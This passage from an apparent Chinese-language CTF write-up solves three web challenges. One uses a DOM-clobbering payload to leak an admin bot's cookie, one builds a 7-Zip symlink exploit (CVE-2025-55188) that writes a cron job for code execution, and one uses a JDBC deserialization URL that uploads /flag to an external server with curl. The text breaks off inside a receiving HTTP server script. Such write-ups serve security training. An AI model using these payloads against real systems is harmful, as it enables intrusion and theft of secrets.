</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;nanoid&#34;</span>: <span style="color:#e6db74">&#34;^5.1.6&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;dompurify&#34;</span>: <span style="color:#e6db74">&#34;^3.3.0&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;jsdom&#34;</span>: <span style="color:#e6db74">&#34;^27.1.0&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;puppeteer&#34;</span>: <span style="color:#e6db74">&#34;^24.29.0&#34;</span>
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;devDependencies&#34;</span>: {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>dompurify是最新版本，不存在bypass的手段，考虑 DOM Clobbering</p>
<p>admin.js：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">auto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">asBool</span>(window.<span style="color:#a6e22e">AUTO_SHARE</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">asPath</span>(window.<span style="color:#a6e22e">CONFIG_PATH</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">includeCookie</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">asBool</span>(window.<span style="color:#a6e22e">CONFIG_COOKIE_DEBUG</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">buildTarget</span>(<span style="color:#a6e22e">base</span>, <span style="color:#a6e22e">sub</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">parts</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">base</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> (<span style="color:#a6e22e">sub</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;&#39;</span>)).<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">stack</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">seg</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">parts</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">seg</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;..&#39;</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">length</span>) <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">pop</span>();
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">seg</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">seg</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;.&#39;</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">seg</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">stack</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">auto</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">buildTarget</span>(<span style="color:#e6db74">&#39;/analytics&#39;</span>, <span style="color:#a6e22e">path</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">qs</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>({ <span style="color:#a6e22e">id</span>, <span style="color:#a6e22e">ua</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">userAgent</span> });
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">includeCookie</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">qs</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;c&#39;</span>, document.<span style="color:#a6e22e">cookie</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">target</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;?&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">qs</span>.<span style="color:#a6e22e">toString</span>()).<span style="color:#66d9ef">catch</span>(() =&gt; {});
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>只要能设置 <code>auto</code> 和 <code>includeCookie</code> 为true，最后fetch <code>/log</code>就可以在 <code>/logs</code> 中记录含有FLAG的 cookie</p>
<p>payload：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">AUTO_SHARE</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">CONFIG_COOKIE_DEBUG</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">CONFIG_PATH</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">../../log</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
</span></span></code></pre></div><p>在网络中找到对应id，让bot去访问对应id内容，执行admin.js时因为构造好的CONFIG_PATH导致拼接时目录穿越，后续会自动去fetch <code>/log</code></p>
<p>最后访问<code>/logs</code>：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/21.png"></p>
<h2 id="77777-time-task">77777 time task<a hidden class="anchor" aria-hidden="true" href="#77777-time-task">#</a></h2>
<p>app.py：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, jsonify, request
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>UPLOAD_DIR<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./uploads&#34;</span>
</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>makedirs(UPLOAD_DIR, exist_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Hello World&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/upload&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;file&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>files:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;No file part&#34;</span>}), <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>    file <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> file<span style="color:#f92672">.</span>filename <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;No selected file&#34;</span>}), <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>    sanitizeFilename<span style="color:#f92672">=</span>file<span style="color:#f92672">.</span>filename<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;..&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;/&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>    ext<span style="color:#f92672">=</span>sanitizeFilename<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ext <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;7z&#34;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Only .7z files are allowed&#34;</span>}), <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>    filepath <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(UPLOAD_DIR, file<span style="color:#f92672">.</span>filename)
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>save(filepath)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ret<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74">&#34;/tmp/7zz&#34;</span>, <span style="color:#e6db74">&#34;x&#34;</span>, filepath],shell<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE,stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ret<span style="color:#f92672">.</span>returncode <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Failed to extract .7z file&#34;</span>, <span style="color:#e6db74">&#34;detail&#34;</span>: ret<span style="color:#f92672">.</span>stderr<span style="color:#f92672">.</span>decode()}), <span style="color:#ae81ff">500</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;success&#34;</span>, <span style="color:#e6db74">&#34;filename&#34;</span>: file<span style="color:#f92672">.</span>filename})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/listfiles&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_files</span>():
</span></span><span style="display:flex;"><span>    dir<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;dir&#34;</span>, <span style="color:#e6db74">&#34;./uploads&#34;</span>)
</span></span><span style="display:flex;"><span>    files <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(dir)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;files&#34;</span>: files})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">3000</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span></code></pre></div><p>执行 <code>os.path.join</code> 时没有使用过滤后的 <code>sanitizeFilename</code>，看上去有目录穿越的问题，但是前面有对于扩展名为7z的限制，所以实际上难以利用，最多是把7z后缀名的文件保存到其他目录</p>
<p>一开始想到软链接，但是7z解压默认把解压目录当作根目录，即<code>/app</code>，所有普通的软链接比如指向<code>/tmp</code>在这样的环境下被解压后都会指向<code>/app/tmp</code>，并且如果链接文件名带有目录穿越的内容，如 <code>../</code> 都会触发报错 <code>ERROR: Dangerous link path was ignored</code></p>
<p>从Dockerfile能找到其他信息：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> python:3.11-slim</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Install cron and 7zip utilities required by the app</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get update <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    <span style="color:#f92672">&amp;&amp;</span> apt-get install -y --no-install-recommends cron wget xz-utils<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    <span style="color:#f92672">&amp;&amp;</span> rm -rf /var/lib/apt/lists/*<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /app</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> cd /tmp <span style="color:#f92672">&amp;&amp;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    wget https://www.7-zip.org/a/7z2500-linux-x64.tar.xz <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    <span style="color:#f92672">&amp;&amp;</span> tar -xvf 7z2500-linux-x64.tar.xz<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Copy the application code</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> app/ ./<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> docker-entrypoint.sh /usr/local/bin/docker-entrypoint.sh<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod +x /usr/local/bin/docker-entrypoint.sh<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Install Python dependencies</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> pip install --no-cache-dir flask<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 3000</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENTRYPOINT</span> [<span style="color:#e6db74">&#34;/usr/local/bin/docker-entrypoint.sh&#34;</span>]<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>7z特意指定了一个版本25.00，搜了搜最近的漏洞，找到CVE-2025-55188，7z版本小于25.01都存在软链接处理问题，对于精心构造的恶意软链接处理时会导致目录穿越</p>
<p>docker-entrypoint.sh：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>set -e
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$FLAG<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>    INSERT_FLAG<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$FLAG<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    export FLAG<span style="color:#f92672">=</span>no_FLAG
</span></span><span style="display:flex;"><span>    FLAG<span style="color:#f92672">=</span>no_FLAG
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    INSERT_FLAG<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;flag{TEST_Dynamic_FLAG}&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo $INSERT_FLAG | tee /flag
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/usr/sbin/cron
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exec python app.py
</span></span></code></pre></div><p>结合题目名称以及 <code>docker-entrypoint.sh</code> 脚本里启动了cron的守护进程，考虑通过定时任务来实现rce</p>
<p>github上的poc：https://github.com/lunbun/CVE-2025-55188/blob/main/poc_extraction_root/make_arb_write_7z.sh</p>
<p>详细的漏洞分析：https://lunbun.dev/blog/cve-2025-55188/</p>
<p>对poc脚本稍作修改，本来想直接覆盖文件 <code>/etc/crontab</code>，但是会失败，后面通过写入 <code>/etc/cron.d</code> 目录进行定时任务达到同样的效果：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Writes to ../file.txt on extraction.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Works on Linux only.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>olddir<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>tempdir<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>cd <span style="color:#e6db74">&#34;</span>$tempdir<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mkdir -p a/b
</span></span><span style="display:flex;"><span>ln -s /a a/b/link
</span></span><span style="display:flex;"><span>7zz a arb_write.7z a/b/link -snl
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ln -s a/b/link/../../ link
</span></span><span style="display:flex;"><span>7zz a arb_write.7z link -snl
</span></span><span style="display:flex;"><span>rm link
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mkdir link
</span></span><span style="display:flex;"><span>mkdir link/etc
</span></span><span style="display:flex;"><span>mkdir link/etc/cron.d
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;* * * * * root cp /flag /app/uploads/flag_\$(cat /flag)&#34;</span> &gt; link/etc/cron.d/exploit
</span></span><span style="display:flex;"><span>7zz a arb_write.7z link/etc/cron.d/exploit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cp arb_write.7z <span style="color:#e6db74">&#34;</span>$olddir<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>cd <span style="color:#e6db74">&#34;</span>$olddir<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>rm -r <span style="color:#e6db74">&#34;</span>$tempdir<span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><p>上传文件后等待1分钟，就可以看到 <code>/uploads</code> 目录下有带有 <code>/flag</code> 文件内容的文件被写入了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -X POST <span style="color:#e6db74">&#39;http://019aaf50-29b9-78e3-bae1-2bc9d2bc9740.geek.ctfplus.cn/upload&#39;</span> -F <span style="color:#e6db74">&#39;file=@arb_write.7z&#39;</span>
</span></span></code></pre></div><p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/20.png"></p>
<h2 id="ezjdbc">ezjdbc<a hidden class="anchor" aria-hidden="true" href="#ezjdbc">#</a></h2>
<p>jdbcController类：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> ctf.geekchallenge.ezjdbc.demos.web;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.sql.DriverManager;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.sql.SQLException;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.bind.annotation.GetMapping;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.bind.annotation.RequestParam;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.bind.annotation.RestController;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@RestController</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* loaded from: ezjdbc-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/ctf/geekchallenge/ezjdbc/demos/web/jdbcController.class */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">jdbcController</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> String CLASS_NAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;com.mysql.cj.jdbc.Driver&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@GetMapping</span>({<span style="color:#e6db74">&#34;/&#34;</span>})
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">index</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Hello Jdbc&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@GetMapping</span>({<span style="color:#e6db74">&#34;/connect&#34;</span>})
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">@RequestParam</span>(<span style="color:#e6db74">&#34;url&#34;</span>) String url, <span style="color:#a6e22e">@RequestParam</span>(<span style="color:#e6db74">&#34;name&#34;</span>) String name, <span style="color:#a6e22e">@RequestParam</span>(<span style="color:#e6db74">&#34;pass&#34;</span>) String pass) <span style="color:#66d9ef">throws</span> SQLException {
</span></span><span style="display:flex;"><span>        DriverManager.<span style="color:#a6e22e">getConnection</span>(url, name, pass);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> url;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>java 1.8，mysql 8.0.19，Commons-Collections 3.2.1：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/17.png"></p>
<p><code>url name</code>都可控，打jdbc反序列化，利用工具创建 fake mysql server：https://github.com/4ra1n/mysql-fake-server/tree/master</p>
<p>curl外带flag，但是 <code>$()</code> 和反引号不知道为什么都不行，考虑 <code>curl -T</code> 上传文件 <code>/flag</code>到vps：</p>
<p><img alt="alt" loading="lazy" src="/images/GeekChallenge16th/19.png"></p>
<p>payload：</p>
<pre tabindex="0"><code>/connect?url=jdbc:mysql://121.40.46.63:3308/test?autoDeserialize=true%26queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;name=base64ZGVzZXJfQ0MzMV9jdXJsIC1UIC9mbGFnIGh0dHA6Ly8xMjEuNDAuNDYuNjM6MjMzMy8=&amp;pass=1
</code></pre><p>vps上搞个支持PUT方法的python http server：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> http.server
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socketserver
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> shutil
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">2333</span> <span style="color:#75715e"># 更改端口</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PutHandler</span>(http<span style="color:#f92672">.</span>server<span style="color:#f92672">.</span>SimpleHTTPRequestHandler):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    自定义 HTTP 请求处理程序，继承 SimpleHTTPRequestHandler 并实现 do_PUT 方法。
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_PUT</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;处理 PUT 请求，用于文件上传/替换&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        
